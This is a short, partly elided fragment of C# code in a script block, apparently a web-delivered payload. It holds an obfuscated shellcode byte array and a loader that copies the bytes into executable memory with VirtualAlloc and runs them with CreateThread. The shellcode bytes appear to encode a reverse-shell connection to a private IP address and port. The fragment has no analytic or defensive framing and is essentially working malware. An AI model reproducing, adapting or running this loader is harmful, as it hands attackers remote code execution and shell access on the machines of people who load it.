...
0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x0a,0x0a,0x0e,0x20,0x68,0x02,0x00,0x11,0x5d,0x89,
...
0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5 };
        ...
        IntPtr kgC = VirtualAlloc(IntPtr.Zero,(UIntPtr)lfBwm8.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(lfBwm8,0,kgC,lfBwm8.Length);
        IntPtr zJ5sGvHrg = IntPtr.Zero;
        IntPtr vFWMl6B4Evx = CreateThread(IntPtr.Zero,UIntPtr.Zero,kgC,IntPtr.Zero,0,ref zJ5sGvHrg);
    }
</script>
